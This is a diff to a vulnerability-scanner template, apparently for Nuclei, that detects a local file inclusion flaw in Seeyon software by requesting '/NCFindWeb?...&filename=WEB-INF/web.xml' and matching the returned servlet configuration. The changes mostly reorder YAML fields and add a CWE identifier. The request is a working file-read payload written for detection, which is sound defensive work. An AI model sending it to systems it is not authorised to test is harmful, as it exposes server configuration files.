@@ -1,5 +1,4 @@
 id: wooyun-2015-148227
-
 info:
   name: Seeyon WooYun - Local File Inclusion
   author: princechaddha
@@ -10,29 +9,24 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-73
   metadata:
     max-request: 1
-  tags: seeyon,wooyun,lfi,zhiyuan,vuln
-
+  tags: lfi,seeyon,vuln,wooyun,zhiyuan
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
+  - matchers:
+      - status:
           - 200
-
-      - type: word
+        type: status
+      - part: body
+        type: word
         words:
-          - "<servlet-name>NCInvokerServlet</servlet-name>"
-        part: body
-
-      - type: word
-        part: header
+          - <servlet-name>NCInvokerServlet</servlet-name>
+      - part: header
+        type: word
         words:
-          - "application/xml"
-
+          - application/xml
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
